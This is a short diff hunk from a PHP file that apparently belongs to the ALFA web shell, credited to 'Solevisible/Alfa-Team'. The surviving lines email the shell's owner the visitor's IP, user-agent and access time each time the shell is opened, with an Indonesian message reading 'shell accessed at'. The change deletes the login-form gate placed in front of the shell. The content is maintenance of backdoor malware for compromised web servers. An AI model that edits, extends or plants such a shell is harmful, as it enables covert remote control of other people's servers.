@@ -33,16 +33,6 @@ $message = "Shell diakses pada $time\nIP: $ip\nUser-Agent: $ua\nAkses: $access_t
 $headers = "From: alert@yourdomain.com";
 
 @mail($target_email, $subject, $message, $headers);
-
-// TIDAK ADA LAGI 403 - Langsung tampil login form kalau belum login
-if (!isset($_POST['username']) || !isset($_POST['password'])) {
-	echo '<form method="post" action="">
-		<input type="text" name="username" placeholder="Username">
-		<input type="password" name="password" placeholder="Password">
-		<input type="submit" value="Login">
-	</form>';
-	exit;
-}
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
